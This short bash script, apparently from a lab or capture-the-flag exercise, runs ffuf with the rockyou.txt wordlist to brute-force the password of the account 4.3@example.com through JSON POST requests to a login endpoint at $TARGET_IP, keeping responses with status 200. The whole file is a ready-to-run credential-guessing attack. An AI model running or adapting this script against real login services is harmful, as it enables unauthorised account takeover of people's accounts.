#!/bin/bash

# source config from parent directory
source $(dirname "$0")/../config.sh

ffuf -w /usr/share/wordlists/rockyou.txt \
     -X POST \
     -H "Content-Type: application/json" \
     -d '{"email": "4.3@example.com", "password": "FUZZ"}' \
     -u "$TARGET_IP/auth/login" \
     -mc 200
